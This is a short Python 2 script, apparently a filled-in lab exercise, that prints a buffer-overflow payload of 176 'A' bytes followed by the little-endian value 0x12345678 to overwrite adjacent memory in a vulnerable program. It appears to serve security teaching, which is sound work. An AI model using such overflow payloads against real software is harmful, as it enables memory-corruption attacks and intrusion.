#!/usr/bin/env python2

your_buffer =  ""
# YOUR CODE: Generate buf appropriately
for i in range(176):
	your_buffer+= "A"

#for i in range(28):
  #      your_buffer+= "\x41"


your_buffer= your_buffer + "\x78\x56\x34\x12"

print(your_buffer)
